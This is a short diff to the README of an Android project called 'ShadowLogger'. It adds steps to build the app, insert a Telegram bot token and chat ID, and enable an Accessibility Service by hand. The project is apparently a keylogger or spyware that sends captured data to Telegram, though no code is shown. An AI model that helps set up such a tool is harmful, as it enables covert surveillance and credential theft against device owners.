@@ -25,3 +25,6 @@
 1. Clone the repo:
    ```bash
    git clone https://github.com/yourusername/ShadowLogger.git
+2. Open in Android Studio or build with Gradle
+3. Replace BOT_TOKEN and CHAT_ID in TelegramUtils.java
+4. Enable Accessibility Service manually after installation
